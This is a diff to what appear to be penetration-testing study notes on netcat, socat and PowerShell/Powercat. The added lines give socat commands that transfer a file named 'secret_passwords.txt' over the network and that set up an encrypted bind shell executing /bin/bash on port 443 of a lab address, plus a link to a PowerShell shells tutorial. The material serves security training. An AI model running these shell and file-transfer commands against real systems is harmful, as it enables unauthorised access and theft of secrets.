@@ -25,7 +25,6 @@ Input, ouput and errors are redirected to network for Bob to interact with.
 
 # Socat
 ## Socat vs Netcat
-
 `nc <remote server's ip address> 80`  
 `socat - TCP4:<remote server's ip address>:80`  
 Connect to server.
@@ -43,7 +42,28 @@ On Windows:
 `ls`
 Oooooh.
 
+## Transfer Files
+File to be sent:  
+`sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt`
+
+Collecting the file:
+`socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create`
+
+## Encrypted Shells
+Setting up encryption for socat
+`openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt`  
+`cat bind_shell.key bind_shell.crt > bind_shell.pem`  
+
+Set up the listener and fork the bin/bash process once a connection is made.  
+`sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash`  
+
+Connect to the encrypted bind shell:  
+`socat - OPENSSL:10.11.0.4:443,verify=0`
+
+
 # PowerShell and Powercat
+
+http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
 
 `Set-ExecutionPolicy -ExecutionPolicy RemoteSigned`
 
